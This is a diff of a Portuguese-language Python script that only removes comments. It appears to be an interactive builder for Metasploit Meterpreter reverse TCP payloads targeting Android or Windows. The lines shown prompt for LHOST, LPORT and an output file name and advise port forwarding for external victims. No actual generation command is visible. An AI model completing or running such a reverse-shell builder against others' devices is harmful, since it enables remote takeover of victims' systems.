@@ -57,19 +57,15 @@ while True:
     
 
     time.sleep(1)
-    # Exibição inicial
     print("\n\033[35m┌─────────────────────────────────────────────────┐")
     print("│          \033[36mEscolha o Alvo do Payload\033[35m          │")
     print("└─────────────────────────────────────────────────┘\033[0m")
 
-    # Instruções para o usuário
     print("\033[33mEscolha um alvo:\033[0m")
     print("\033[32m[1] Android (Meterpreter Reverse TCP)\033[0m")
     print("\033[32m[2] Windows (Meterpreter Reverse TCP)\033[0m")
-    # Entrada de dados
     alvo = input("\n\033[32mDigite o número do seu alvo (1 ou 2): \033[0m")
 
-# Definindo o alvo
 
     def definir_alvo(alvo):
         if alvo == "1":
@@ -106,12 +102,10 @@ while True:
         print("  - Para conexões externas, use seu IP público e faça Port Forwarding.")
         lhost = input("\033[32m[+] Digite o LHOST: \033[0m")
 
-        # Explicação sobre LPORT
         print("\n\033[33m➤ LPORT é a porta que o Metasploit irá escutar.")
         print("  - O padrão é \033[34m4444\033[0m, mas você pode escolher outra.")
         lport = input("\033[32m[+] Digite a Porta: \033[0m")
 
-        # Explicação sobre o nome do arquivo
         print("\n\033[33m➤ Nome do arquivo final do payload.")
         print("  - Exemplo: \033[34mpayload.exe\033[0m")
         payload = input("\033[32m[+] Digite o nome do arquivo de saída: \033[0m")
